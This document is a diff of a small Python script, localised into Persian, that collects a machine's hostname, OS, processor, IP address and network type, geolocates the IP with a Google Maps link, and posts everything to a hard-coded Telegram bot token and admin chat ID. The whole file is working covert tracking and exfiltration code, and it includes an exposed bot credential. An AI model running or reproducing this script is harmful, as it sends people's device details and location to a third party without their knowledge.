@@ -1,80 +1,75 @@
-import hashlib
 import socket
 import platform
 import requests
 import os
 
-# Telegram Bot Configuration
-BOT_TOKEN = "8182982379:AAFbB7vFpuCTjH6MHDu7CcZR1nog5grZEWg"
-ADMIN_CHAT_ID = "8152202322"
+# تنظیمات ربات تلگرام
+توکن_ربات = "8182982379:AAFbB7vFpuCTjH6MHDu7CcZR1nog5grZEWg"
+ایدی_ادمین = "8152202322"
 
-def get_device_info():
-    """Get device name, model, and operating system."""
-    device_name = platform.node()
-    system_info = platform.system() + " " + platform.release()
-    model_info = platform.machine()
-    return device_name, system_info, model_info
+def دریافت_اطلاعات_دستگاه():
+    """دریافت نام دستگاه، مدل، و سیستم‌عامل"""
+    نام_دستگاه = platform.node()
+    سیستم_عامل = platform.system() + " " + platform.release()
+    مدل_دستگاه = platform.machine()
+    پردازنده = platform.processor()
+    return نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده
 
-def get_user_ip():
-    """Retrieve the user's IP address."""
+def دریافت_آیپی_کاربر():
+    """دریافت آی‌پی کاربر"""
     try:
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        return ip_address
+        میزبان = socket.gethostname()
+        آیپی = socket.gethostbyname(میزبان)
+        return آیپی
     except Exception as e:
-        return f"Error retrieving IP: {e}"
+        return f"خطا در دریافت آی‌پی: {e}"
 
-def hash_ip(ip):
-    """Hash the IP for additional security."""
-    return hashlib.sha256(ip.encode()).hexdigest() if ip else None
-
-def get_network_type():
-    """Determine the network type (WiFi or Mobile Data)."""
+def دریافت_نوع_شبکه():
+    """تشخیص نوع اینترنت (WiFi یا داده موبایل)"""
     try:
-        network_type = "Unknown"
+        نوع_شبکه = "نامشخص"
         if "WIFI" in os.popen("ip route").read():
-            network_type = "WiFi"
+            نوع_شبکه = "WiFi"
         else:
-            network_type = "Mobile Data"
-        return network_type
+            نوع_شبکه = "داده موبایل"
+        return نوع_شبکه
     except Exception as e:
-        return f"Error determining network type: {e}"
+        return f"خطا در تشخیص شبکه: {e}"
 
-def get_location(ip):
-    """Retrieve location data based on the IP and generate a Google Maps link."""
+def دریافت_موقعیت_مکانی(آیپی):
+    """دریافت موقعیت مکانی براساس آی‌پی و ایجاد لینک گوگل مپ"""
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}")
-        data = response.json()
-        latitude, longitude = data['lat'], data['lon']
-        location_info = f"{data['country']}, {data['regionName']}, {data['city']}"
-        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
-        return location_info, google_maps_link
+        پاسخ = requests.get(f"http://ip-api.com/json/{آیپی}")
+        داده = پاسخ.json()
+        عرض, طول = داده['lat'], داده['lon']
+        اطلاعات_مکانی = f"{داده['country']}, {داده['regionName']}, {داده['city']}"
+        لینک_گوگل_مپ = f"https://www.google.com/maps?q={عرض},{طول}"
+        return اطلاعات_مکانی, لینک_گوگل_مپ
     except Exception as e:
-        return f"Error retrieving location: {e}", ""
+        return f"خطا در دریافت موقعیت مکانی: {e}", ""
 
-def send_to_admin(message):
-    """Send the message only to the admin via Telegram."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": ADMIN_CHAT_ID, "text": message}
-    requests.post(url, data=data)
+def ارسال_به_ادمین(پیام):
+    """ارسال پیام فقط به ادمین از طریق تلگرام"""
+    لینک = f"https://api.telegram.org/bot{توکن_ربات}/sendMessage"
+    داده = {"chat_id": ایدی_ادمین, "text": پیام}
+    requests.post(لینک, داده)
 
-# Collect information and send
-device_name, system_info, model_info = get_device_info()
-user_ip = get_user_ip()
-hashed_ip = hash_ip(user_ip)
-network_type = get_network_type()
-location_info, google_maps_link = get_location(user_ip)
+# دریافت و ارسال اطلاعات
+نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده = دریافت_اطلاعات_دستگاه()
+آیپی_کاربر = دریافت_آیپی_کاربر()
+نوع_شبکه = دریافت_نوع_شبکه()
+اطلاعات_مکانی, لینک_گوگل_مپ = دریافت_موقعیت_مکانی(آیپی_کاربر)
 
-message = f"""🔹 New Device Information Recorded:
-📱 Device Name: {device_name}
-📟 Model: {model_info}
-🖥️ OS: {system_info}
-🌍 IP Address: {user_ip}
-🔒 Hashed IP: {hashed_ip}
-📡 Network Type: {network_type}
-📍 Location: {location_info}
-🗺️ Google Maps: [View Location]({google_maps_link})
+پیام = f"""🔹 اطلاعات جدید دستگاه ثبت شد:
+📱 نام دستگاه: {نام_دستگاه}
+📟 مدل: {مدل_دستگاه}
+⚙️ پردازنده: {پردازنده}
+🖥️ سیستم‌عامل: {سیستم_عامل}
+🌍 آی‌پی: {آیپی_کاربر}
+📡 نوع اینترنت: {نوع_شبکه}
+📍 موقعیت مکانی: {اطلاعات_مکانی}
+🗺️ مشاهده در گوگل مپ: [موقعیت مکانی]({لینک_گوگل_مپ})
 """
 
-send_to_admin(message)
-print("✅ Data successfully sent to Telegram.")
+ارسال_به_ادمین(پیام)
+print("✅ اطلاعات با موفقیت به تلگرام ارسال شد.")
